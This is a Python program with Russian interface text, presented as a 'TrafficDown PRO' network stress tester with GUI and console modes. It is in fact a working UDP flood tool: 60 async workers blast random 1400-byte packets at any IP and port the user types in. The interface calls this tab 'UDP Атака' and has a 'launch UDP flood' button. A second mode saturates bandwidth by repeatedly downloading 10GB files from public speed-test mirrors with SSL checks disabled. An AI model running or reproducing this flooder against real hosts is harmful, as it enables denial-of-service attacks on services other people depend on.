import os
import sys
import time
import asyncio
import threading
import platform
import socket
import random
import subprocess
from concurrent.futures import ThreadPoolExecutor

# --- АВТОМАТИЧЕСКАЯ УСТАНОВКА БИБЛИОТЕК ---
def install_requirements():
    required_libs = ["aiohttp", "customtkinter", "rich", "psutil", "requests"]
    installed = False
    
    for lib in required_libs:
        try:
            __import__(lib)
        except ImportError:
            if not installed:
                print("------------------------------------------------")
                print(f"[SYSTEM] Обнаружены недостающие пакеты. Начинаю установку...")
                installed = True
            
            print(f"   >>> Установка {lib}...")
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", lib], 
                                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                print(f"   [OK] {lib} успешно установлен.")
            except Exception as e:
                print(f"   [ERROR] Не удалось установить {lib}: {e}")
                
    if installed:
        print("[SYSTEM] Все пакеты установлены. Запуск программы...")
        time.sleep(1)
        os.system('cls' if os.name == 'nt' else 'clear')

# Запуск проверки перед импортом
install_requirements()

# --- PRO IMPORTS ---
import aiohttp
import psutil
import customtkinter as ctk
from rich.live import Live
from rich.layout import Layout
from rich.panel import Panel
from rich.table import Table
from rich.console import Console
from rich.align import Align
from rich import box

# --- КОНФИГУРАЦИЯ ЦЕЛЕЙ ДЛЯ СКАЧИВАНИЯ ---
URLS = [
    'https://speed.hetzner.de/10GB.bin',
    'https://proof.ovh.net/files/10Gb.dat',
    'http://speedtest.tele2.net/10GB.zip',
    'http://speedtest-ny.turnkeyinternet.net/10000mb.bin',
    'https://speedtest.selectel.ru/10GB',
]

class TrafficEngine:
    """
    Ядро системы. Асинхронная работа для максимальной нагрузки канала.
    """
    def __init__(self):
        self.running = False
        self.mode = None # 'download' или 'upload'
        
        # Статистика
        self.bytes_downloaded = 0
        self.bytes_uploaded = 0
        
        # Конфиг UDP
        self.target_ip = "127.0.0.1"
        self.target_port = 80
        
        # Асинхронный цикл
        self.loop = asyncio.new_event_loop()
        self.thread = threading.Thread(target=self._start_loop, daemon=True)
        self.thread.start()

    def _start_loop(self):
        asyncio.set_event_loop(self.loop)
        self.loop.run_forever()

    def start_download(self):
        if self.running: return
        self.running = True
        self.mode = 'download'
        # Запускаем 12 воркеров для загрузки канала
        for _ in range(12):
            asyncio.run_coroutine_threadsafe(self._download_worker(), self.loop)

    def start_upload(self, ip, port):
        if self.running: return
        self.running = True
        self.mode = 'upload'
        self.target_ip = ip
        self.target_port = int(port)
        # Запускаем 60 UDP воркеров для стресс-теста отдачи
        for _ in range(60):
            asyncio.run_coroutine_threadsafe(self._upload_worker(), self.loop)

    def stop(self):
        self.running = False
        self.mode = None

    async def _download_worker(self):
        # Отключаем SSL проверку для скорости
        connector = aiohttp.TCPConnector(verify_ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            while self.running and self.mode == 'download':
                url = random.choice(URLS)
                try:
                    async with session.get(url) as resp:
                        while self.running:
                            chunk = await resp.content.read(1024 * 512) # 512KB chunk
                            if not chunk: break
                            self.bytes_downloaded += len(chunk)
                except:
                    await asyncio.sleep(0.5)

    async def _upload_worker(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        # Генерируем рандомный пакет (мусор)
        payload = os.urandom(1400) 
        
        while self.running and self.mode == 'upload':
            try:
                sock.sendto(payload, (self.target_ip, self.target_port))
                self.bytes_uploaded += len(payload)
                # Микро-пауза каждые 100 пакетов, чтобы не вешать сам Python
                if self.bytes_uploaded % 100 == 0: 
                    await asyncio.sleep(0) 
            except:
                await asyncio.sleep(0.1)

    def get_stats(self):
        return {
            "dl_total": self.bytes_downloaded / 1024 / 1024, # MB
            "ul_total": self.bytes_uploaded / 1024 / 1024,   # MB
            "active": self.running,
            "mode": self.mode
        }

# --- TUI (КОНСОЛЬНЫЙ ИНТЕРФЕЙС) ---
class TUI:
    def __init__(self, engine):
        self.engine = engine
        self.last_dl = 0
        self.last_ul = 0
        self.last_time = time.time()

    def generate_layout(self):
        layout = Layout()
        layout.split_column(
            Layout(name="header", size=3),
            Layout(name="body", ratio=1),
            Layout(name="footer", size=3)
        )
        return layout

    def get_header(self):
        return Panel(
            Align.center("[bold cyan]🔥 TrafficDown [white]PRO[/white] // СЕТЕВОЙ СТРЕСС-ТЕСТЕР 🔥[/]"),
            style="on #121212", box=box.DOUBLE
        )

    def get_stats_panel(self):
        stats = self.engine.get_stats()
        
        now = time.time()
        delta = now - self.last_time
        if delta < 1: delta = 1
        
        dl_speed = (stats['dl_total'] - self.last_dl) / delta
        ul_speed = (stats['ul_total'] - self.last_ul) / delta
        
        self.last_dl = stats['dl_total']
        self.last_ul = stats['ul_total']
        self.last_time = now

        table = Table(expand=True, box=box.SIMPLE)
        table.add_column("Метрика", style="dim")
        table.add_column("Значение", justify="right", style="bold")
        
        status_text = "АКТИВЕН" if stats['active'] else "ОЖИДАНИЕ"
        status_color = "green" if stats['active'] else "red"
        
        mode_map = {'download': 'ЗАГРУЗКА', 'upload': 'ВЫГРУЗКА (UDP)'}
        current_mode = mode_map.get(stats['mode'], 'НЕТ')
        
        table.add_row("Статус", f"[{status_color}]{status_text}[/]")
        table.add_row("Режим", f"[white]{current_mode}[/]")
        table.add_row("Скорость Скачивания", f"[cyan]{dl_speed:.2f} MB/s[/]")
        table.add_row("Скорость Отдачи", f"[magenta]{ul_speed:.2f} MB/s[/]")
        table.add_row("Всего скачано", f"{stats['dl_total']:.2f} MB")
        table.add_row("Всего отдано", f"{stats['ul_total']:.2f} MB")
        
        # Системные ресурсы
        cpu = psutil.cpu_percent()
        ram = psutil.virtual_memory().percent
        table.add_row("Загрузка CPU", f"{cpu}%")
        table.add_row("Загрузка RAM", f"{ram}%")

        return Panel(table, title="Статистика в реальном времени", border_style="blue")

    def run(self):
        layout = self.generate_layout()
        layout["header"].update(self.get_header())
        
        with Live(layout, refresh_per_second=2, screen=True) as live:
            while True:
                layout["body"].update(self.get_stats_panel())
                layout["footer"].update(Panel(Align.center("[dim]Нажмите Ctrl+C для выхода | Работает автоматически[/]"), style="dim"))
                
                # Авто-запуск скачивания в консольном режиме для теста
                if not self.engine.running:
                    self.engine.start_download()
                    
                time.sleep(0.5)

# --- GUI (ГРАФИЧЕСКИЙ ИНТЕРФЕЙС) ---
class App(object):
    def __init__(self, engine):
        self.engine = engine
        
        self.root = ctk.CTk()
        self.root.title("TrafficDown Ultimate v2.0 RU")
        self.root.geometry("700x520")
        self.root.resizable(False, False)
        ctk.set_appearance_mode("Dark")
        ctk.set_default_color_theme("green")
        
        self.last_dl = 0
        self.last_ul = 0
        self.last_time = time.time()
        
        self.setup_ui()
        self.update_stats()
        
    def setup_ui(self):
        # Сайдбар
        self.sidebar = ctk.CTkFrame(self.root, width=160, corner_radius=0)
        self.sidebar.pack(side="left", fill="y")
        
        self.logo = ctk.CTkLabel(self.sidebar, text="🚀 TrafficDown", font=ctk.CTkFont(size=20, weight="bold"))
        self.logo.pack(padx=20, pady=30)
        
        self.ver_lbl = ctk.CTkLabel(self.sidebar, text="Версия: PRO 2.0", text_color="gray")
        self.ver_lbl.pack(side="bottom", pady=20)
        
        # Основная зона
        self.main = ctk.CTkFrame(self.root, corner_radius=10, fg_color="transparent")
        self.main.pack(side="right", fill="both", expand=True, padx=20, pady=20)
        
        # Вкладки
        self.tabview = ctk.CTkTabview(self.main)
        self.tabview.pack(fill="both", expand=True)
        self.tabview.add("Скачивание")
        self.tabview.add("UDP Атака (Upload)")
        
        # --- Вкладка Скачивания ---
        self.lbl_info_dl = ctk.CTkLabel(self.tabview.tab("Скачивание"), text="Тест скорости входящего канала", font=("Arial", 14))
        self.lbl_info_dl.pack(pady=10)

        self.dl_speed_lbl = ctk.CTkLabel(self.tabview.tab("Скачивание"), text="0.00 MB/s", font=("Consolas", 45, "bold"), text_color="#00FF00")
        self.dl_speed_lbl.pack(pady=20)
        
        self.dl_total_lbl = ctk.CTkLabel(self.tabview.tab("Скачивание"), text="Всего скачано: 0 MB", font=("Arial", 14))
        self.dl_total_lbl.pack(pady=5)

        self.dl_btn = ctk.CTkButton(self.tabview.tab("Скачивание"), text="🔥 ЗАПУСТИТЬ ЗАГРУЗКУ", 
                                       command=self.toggle_dl, height=50, width=250, font=("Arial", 15, "bold"), 
                                       fg_color="#007BFF", hover_color="#0056b3")
        self.dl_btn.pack(pady=30)

        # --- Вкладка Выгрузки (UDP) ---
        self.lbl_info_ul = ctk.CTkLabel(self.tabview.tab("UDP Атака (Upload)"), text="Настройка цели для UDP флуда", font=("Arial", 14))
        self.lbl_info_ul.pack(pady=5)

        self.ip_entry = ctk.CTkEntry(self.tabview.tab("UDP Атака (Upload)"), placeholder_text="IP адрес (напр. 192.168.1.1)", width=300)
        self.ip_entry.pack(pady=10)
        
        self.port_entry = ctk.CTkEntry(self.tabview.tab("UDP Атака (Upload)"), placeholder_text="Порт (напр. 80)", width=300)
        self.port_entry.pack(pady=5)
        
        self.ul_speed_lbl = ctk.CTkLabel(self.tabview.tab("UDP Атака (Upload)"), text="0.00 MB/s", font=("Consolas", 40, "bold"), text_color="#FF4500")
        self.ul_speed_lbl.pack(pady=15)

        self.ul_btn = ctk.CTkButton(self.tabview.tab("UDP Атака (Upload)"), text="💀 ЗАПУСТИТЬ UDP ФЛУД", 
                                       command=self.toggle_ul, height=50, width=250, font=("Arial", 15, "bold"), 
                                       fg_color="#DC3545", hover_color="#8B0000")
        self.ul_btn.pack(pady=10)

        # Футер (Система)
        self.sys_lbl = ctk.CTkLabel(self.root, text="CPU: 0% | RAM: 0%", text_color="gray", font=("Arial", 12))
        self.sys_lbl.place(relx=0.95, rely=0.95, anchor="se")

    def toggle_dl(self):
        if self.engine.running:
            self.engine.stop()
            self.dl_btn.configure(text="🔥 ЗАПУСТИТЬ ЗАГРУЗКУ", fg_color="#007BFF")
        else:
            self.engine.start_download()
            self.dl_btn.configure(text="⛔ ОСТАНОВИТЬ", fg_color="#FF0000")

    def toggle_ul(self):
        if self.engine.running:
            self.engine.stop()
            self.ul_btn.configure(text="💀 ЗАПУСТИТЬ UDP ФЛУД", fg_color="#DC3545")
            self.ip_entry.configure(state="normal")
            self.port_entry.configure(state="normal")
        else:
            ip = self.ip_entry.get()
            port = self.port_entry.get()
            if not ip or not port: return
            
            self.engine.start_upload(ip, port)
            self.ul_btn.configure(text="🛑 ОСТАНОВИТЬ АТАКУ", fg_color="#555555")
            self.ip_entry.configure(state="disabled")
            self.port_entry.configure(state="disabled")

    def update_stats(self):
        stats = self.engine.get_stats()
        now = time.time()
        delta = now - self.last_time
        if delta < 0.1: delta = 0.1
        
        # Расчет скорости
        dl_s = (stats['dl_total'] - self.last_dl) / delta
        ul_s = (stats['ul_total'] - self.last_ul) / delta
        
        self.last_dl = stats['dl_total']
        self.last_ul = stats['ul_total']
        self.last_time = now
        
        # Обновление UI
        self.dl_speed_lbl.configure(text=f"{dl_s:.2f} MB/s")
        self.dl_total_lbl.configure(text=f"Всего скачано: {stats['dl_total']:.1f} MB")
        
        self.ul_speed_lbl.configure(text=f"{ul_s:.2f} MB/s")
        
        cpu = psutil.cpu_percent()
        ram = psutil.virtual_memory().percent
        self.sys_lbl.configure(text=f"CPU: {cpu}% | RAM: {ram}%")
        
        self.root.after(500, self.update_stats)

    def run(self):
        self.root.mainloop()

# --- ТОЧКА ВХОДА ---
if __name__ == "__main__":
    engine = TrafficEngine()
    
    # Определение режима работы
    use_gui = False
    if platform.system() == "Windows":
        use_gui = True
    elif os.environ.get('DISPLAY'):
        use_gui = True
        
    # Аргументы командной строки
    if len(sys.argv) > 1:
        if sys.argv[1] == '--console': use_gui = False
        if sys.argv[1] == '--gui': use_gui = True

    try:
        if use_gui:
            try:
                app = App(engine)
                app.run()
            except Exception as e:
                print(f"[ERROR] Ошибка запуска GUI: {e}. Переход в консольный режим...")
                time.sleep(2)
                TUI(engine).run()
        else:
            TUI(engine).run()
    except KeyboardInterrupt:
        print("\n[INFO] Остановка процессов...")
        engine.stop()
        os._exit(0)